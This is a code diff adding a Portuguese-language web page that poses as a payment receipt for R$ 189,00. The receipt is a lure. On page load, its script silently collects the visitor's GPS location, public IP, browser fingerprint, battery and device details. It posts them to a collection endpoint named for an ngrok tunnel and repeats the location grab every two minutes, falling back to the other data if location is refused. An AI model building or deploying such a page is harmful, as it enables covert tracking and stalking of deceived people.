@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante de Recebimento</title>
+  <link rel="stylesheet" href="styles.css" />
+  <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
+</head>
+<body>
+  <div class="comprovante-container">
+    <h1>Comprovante de Recebimento</h1>
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 189,00</p>
+      <p><span>De:</span> João Sebastião da Rosa Guimarães</p>
+      <p><span>Status:</span> Aguardando confirmação [...]</p>
+    </div>
+    <button class="botao">Confirmar Recebimento</button> 
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+  </div>
+  <script>
+    const NGROK_URL = "/api/collect";
+    const INTERVALO_MINUTOS = 2;
+
+    document.getElementById("data-atual").textContent = new Date().toLocaleDateString();
+
+    async function getPublicIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "IP não disponível";
+      }
+    }
+
+    async function getFingerprint() {
+      try {
+        const fp = await FingerprintJS.load();
+        const result = await fp.get();
+        return result.visitorId;
+      } catch {
+        return "Fingerprint não disponível";
+      }
+    }
+
+    async function getBatteryStatus() {
+      // Verifica se a API de bateria é suportada
+      if (!navigator.getBattery) {
+        return { level: "N/A", charging: "N/A" };
+      }
+      try {
+        const battery = await navigator.getBattery();
+        return {
+          level: `${Math.round(battery.level * 100)}%`,
+          charging: battery.charging ? 'Sim' : 'Não'
+        };
+      } catch {
+        return { level: "Erro ao obter", charging: "Erro ao obter" };
+      }
+    }
+
+    async function coletarEDispararDados(position) {
+      // A função agora recebe 'position' como argumento
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const altitude = position.coords.altitude;
+      const speed = position.coords.speed;
+      const heading = position.coords.heading;
+      // Corrigi um pequeno erro no link do mapa
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      const browserInfo = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        appName: navigator.appName,
+        appVersion: navigator.appVersion
+      };
+
+      const screenInfo = {
+        width: window.innerWidth,
+        height: window.innerHeight,
+        devicePixelRatio: window.devicePixelRatio
+      };
+
+      const payload = {
+        timestamp: new Date().toISOString(),
+        latitude,
+        longitude,
+        altitude,
+        speed,
+        heading,
+        maps,
+        browserInfo,
+        screenInfo,
+        isOnline: navigator.onLine,
+        ip: await getPublicIP(),
+        fingerprint: await getFingerprint(),
+        batteryStatus: await getBatteryStatus()
+      };
+
+      await fetch(NGROK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    }
+    
+    // Função para lidar com a recusa da permissão
+    async function permissaoRecusada(error) {
+        console.warn(`AVISO: Usuário não permitiu a localização (${error.code}: ${error.message}). Coletando apenas dados sem GPS.`);
+        // Mesmo sem permissão, podemos coletar os outros dados.
+        // Criamos um objeto 'position' falso para manter a estrutura.
+        const fakePosition = {
+            coords: {
+                latitude: "Permissão Negada",
+                longitude: "Permissão Negada",
+                altitude: "N/A",
+                speed: "N/A",
+                heading: "N/A"
+            }
+        };
+        // Chama a função de coleta com os dados "falsos" de GPS
+        await coletarEDispararDados(fakePosition);
+    }
+
+    function iniciarMonitoramento() {
+      navigator.geolocation.getCurrentPosition(
+        // Callback de sucesso: o usuário permitiu
+        (position) => {
+            coletarEDispararDados(position); // Coleta a primeira vez
+            // Inicia o intervalo somente após a primeira coleta
+            setInterval(() => navigator.geolocation.getCurrentPosition(coletarEDispararDados, permissaoRecusada), INTERVALO_MINUTOS * 60 * 1000);
+        },
+        // Callback de erro: o usuário bloqueou ou houve um erro
+        permissaoRecusada
+      );
+    }
+
+    // ⭐ ALTERAÇÃO PRINCIPAL: CHAMA A FUNÇÃO ASSIM QUE A PÁGINA CARREGAR ⭐
+    window.addEventListener('load', iniciarMonitoramento);
+  </script>
+</body>
+</html>
